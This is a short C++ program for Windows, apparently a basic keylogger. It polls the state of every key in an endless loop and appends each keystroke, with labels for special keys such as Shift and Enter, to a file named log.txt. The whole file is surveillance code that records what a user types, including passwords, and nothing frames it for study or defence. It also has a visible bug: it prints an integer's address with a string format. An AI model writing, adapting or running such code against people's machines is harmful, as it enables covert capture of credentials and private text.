#include <iostream>
#include <windows.h>
#include <string.h>
using namespace std;
void SaveInfo(int _key, char *file)
{
	cout << " KEY: " << _key << endl;
	FILE *OUTFILE;
	OUTFILE = fopen(file,"a+");
	
	if(_key == VK_SHIFT)
	{
		fprintf(OUTFILE, "[SHIFT]");
	}
	else if(_key == VK_CONTROL)
	{
		fprintf(OUTFILE, "[CTRL]");
	}
	else if(_key == VK_MENU)
	{
		fprintf(OUTFILE, "[ALT]");
	}
	else if (_key == VK_RETURN)
	{
		fprintf(OUTFILE, "[ENTER]\n"); // ???
	}
	else if(_key == VK_PAUSE)
	{
		fprintf(OUTFILE, "[PAUSE]");
	}
	else if (_key == VK_CAPITAL)
	{
		fprintf(OUTFILE, "[CAPS LOCK]");
	}
	else if (_key == VK_ESCAPE)
	{
		fprintf(OUTFILE, "[ESCAPE]");
	}
	else if (_key == VK_SPACE)
	{
		fprintf(OUTFILE, "[SPACES]");
	}
	fprintf(OUTFILE,"%s",&_key);
	fclose(OUTFILE);
}

int main(int argc, char** argv)
{
	while(true)
	{
		for (int i = 8; i <= 255; i++)
		{
			if(GetAsyncKeyState(i) == -32767)
			{
				SaveInfo(i, "log.txt");
			}
		}
	}
	return 0;
}

